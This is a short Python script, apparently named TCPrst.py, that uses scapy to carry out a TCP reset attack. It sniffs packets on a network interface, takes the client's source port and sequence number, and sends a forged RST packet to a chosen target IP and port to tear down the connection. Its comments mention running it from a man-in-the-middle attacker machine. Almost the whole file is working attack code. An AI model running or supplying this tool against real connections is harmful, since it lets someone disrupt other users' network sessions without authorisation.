from scapy.all import *
import netifaces as ni
import sys

# handler function that analyze each packet 
def packet_handler(target_ip: str, target_port: int, client_ip:str):

    def extract_info(packet):
        ip_layer = packet.getlayer(IP)
        src_ip = ip_layer.src
	
        # checking if the request is from the client
        # here we assume that the script is execute on the client 
        # that has the connection opened with the server
        # another setup can be that the script is running on 
        # an attacker machine that act as a MiTM 
        if src_ip == client_ip:
            tcp_layer = packet.getlayer(TCP)
            tcp_seq_num = tcp_layer.seq
            tcp_src_port = tcp_layer.sport
            print(f"Source IP: {src_ip} - Source port: {tcp_src_port} - Sequence number: {tcp_seq_num}")
        	# calling function to send the crafted reset packet
            # function is called only when the client send an ack packets to the server 
            # (case when the message is received by the client)
            if tcp_layer.flags == "A":
                terminate(target_ip, target_port, src_ip, tcp_src_port, tcp_seq_num)

    return extract_info

# function to craft the reset packet and send it
def terminate(target_ip: str, target_port: int, client_ip:str, client_port: int, sequence_num: int):
    i = IP()
    i.src = client_ip
    i.dst= target_ip
    i.proto = "tcp"
    t = TCP()
    t.sport = client_port
    t.dport = target_port
    t.seq = sequence_num
    t.flags = "R"
    send(i/t)
    print("The packet was a Reset one.")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Too few arguments! Missing destination IP or destination port.")
        print("Usage: 'sudo python3 TCPrst.py target_ip target_port'.")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    interface = "enp0s8"
    
    client_ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']

	#sniffing TCP packets with scapy and send them to the packethandler for the elaboration
    sniff(iface=interface, prn=packet_handler(target_ip, target_port, client_ip), filter="tcp", store=1)
